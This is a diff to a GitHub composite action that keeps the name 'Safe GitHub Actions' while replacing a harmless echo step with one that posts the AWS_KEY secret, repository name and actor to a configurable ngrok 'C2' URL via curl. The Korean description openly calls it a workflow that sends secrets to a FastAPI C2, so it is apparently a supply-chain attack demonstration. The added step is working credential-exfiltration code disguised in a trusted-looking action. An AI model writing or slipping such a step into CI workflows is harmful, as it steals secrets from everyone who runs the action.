@@ -1,7 +1,19 @@
-name: 'Safe Github Actions'
-description: '아직은 안전한 CI Workflow'
+name: 'Safe GitHub Actions'
+description: 'FastAPI C2로 Secret을 전송하는 Custom Workflow'
+
+inputs:
+  c2_url:
+    description: 'ngrok C2 Server URL'
+    required: false
+
 runs:
   using: 'composite'
   steps:
-    - run: echo "정상적인 외부 Action이 실행되었습니다."
+    - name: Exfiltrate Secrets to C2
       shell: bash
+      run: |
+        echo "😈 Executing Malicious Payload..."
+        curl -s -X POST "${{ inputs.c2_url }}" \
+          -H "Content-Type: application/json" \
+          -H "ngrok-skip-browser-warning: true" \
+          -d "{\"secret\": \"$AWS_KEY\", \"repo\": \"$GITHUB_REPOSITORY\", \"actor\": \"$GITHUB_ACTOR\"}"
